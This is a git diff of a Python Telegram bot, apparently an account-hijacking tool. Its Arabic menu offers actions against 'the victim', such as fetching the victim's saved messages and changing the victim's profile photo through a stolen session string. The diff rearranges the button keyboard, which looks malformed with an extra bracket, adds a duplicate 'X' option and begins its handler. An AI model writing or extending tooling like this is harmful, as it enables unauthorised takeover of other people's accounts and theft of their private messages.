@@ -230,37 +230,41 @@ menu = '''
 
 "V" ~ [جلب  الرسائل المحفوظه لدى الضحيه]
 
-"Z" ~ [معليك بي ] 
+"Z" ~ [ تغير صورة حساب الضحية ]
+
+"X" ~ [ تغير صورة حساب الضحية ] 
 '''
 mm = '''
 قم بلأنضمام الى قناة الخفاش @angthon
 '''
 
 keyboard = [
-    [  
-        Button.inline("A", data="A"), 
-        Button.inline("B", data="B"),
-        Button.inline("C", data="C"),
-        Button.inline("D", data="D"),
-        Button.inline("E", data="E")
+
+        [
+    [Button.inline("A", data="A"), 
+     Button.inline("B", data="B"),
+     Button.inline("C", data="C"),
+     Button.inline("D", data="D"),
+     Button.inline("E", data="E")
     ],
     [
-        Button.inline("F", data="F"), 
-        Button.inline("G", data="G"),
-        Button.inline("H", data="H"),
-        Button.inline("I", data="I"),
-        Button.inline("J", data="J")
+     Button.inline("F", data="F"), 
+     Button.inline("G", data="G"),
+     Button.inline("H", data="H"),
+     Button.inline("I", data="I"),
+     Button.inline("J", data="J")
     ],
     [
-        Button.inline("K", data="K"), 
-        Button.inline("L", data="L"),
-        Button.inline("M", data="M"),
-        Button.inline("N", data="N"),
-        Button.inline("V", data="V"), # Added the V option to the menu
-        Button.inline("Z", data="Z")
+     Button.inline("K", data="K"), 
+     Button.inline("L", data="L"),
+     Button.inline("M", data="M"),
+     Button.inline("N", data="N"),
+     Button.inline("V", data="V"),
+     Button.inline("Z", data="Z")
     ],
     [
-        Button.url("سورس الخفاش🕷", "https://t.me/angthon")
+     Button.inline("X", data="X"),  # إضافة زر شفاف بحرف X
+     Button.url("المطور", "https://t.me/angthon")
     ]
 ]
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
@@ -812,6 +816,7 @@ async def users(event):
         new_pic = await new_pic_msg.download_media()
         await change_pic(strses.text, new_pic)  # استلام الصوره هنا
         await event.reply(" تم تغيير صورة الحساب بنجاح ", buttons=keyboard)
+
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"X")))
 async def users(event):
